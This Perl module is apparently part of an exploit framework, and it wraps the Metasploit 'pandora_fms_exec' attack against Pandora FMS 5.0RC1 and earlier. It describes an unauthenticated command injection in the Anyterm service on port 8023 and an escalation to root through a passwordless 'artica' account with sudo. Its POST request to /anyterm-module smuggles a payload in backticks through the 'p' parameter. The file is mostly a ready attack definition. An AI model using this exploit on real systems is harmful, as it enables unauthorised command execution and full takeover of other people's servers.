package MSFExploits::Exploits::PANDORA::MSF::PandoraFmsExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PANDORA);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "PandoraFmsExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.

        It will leverage an unauthenticated command injection in the Anyterm service on

        port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1

        the user \"artica\" is not assigned a password by default, which makes it possible to su

        to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a

        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0

        and lower force a password for the \"artica\" user during installation.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "pandora_fms_exec",
  PATHS       => [""],
  PAYLOAD     => "a=open&p=`__PAYLOAD\\.ENCODED__`&",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The base path to the Pandora instance",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'anyterm-module',
      PAYLOAD      => 'a=open&p=%60__PAYLOAD__%60',
      TEXT   => 'Sending Exploit #2 Request : [POST] /anyterm-module',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
